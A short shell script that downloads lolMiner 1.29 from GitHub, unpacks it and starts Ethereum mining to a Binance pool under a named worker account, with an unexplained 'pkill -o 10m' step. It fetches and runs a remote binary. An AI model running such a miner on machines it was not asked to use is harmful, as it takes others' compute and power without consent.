#!/bin/sh
pkill -o 10m
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
tar -xf lolMiner_v1.29_Lin64.tar.gz
pkill -o 10m
cd 1.29
./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user Gok001.001 --tstop 84 --tstart 73 --ethstratum ETHPROXY
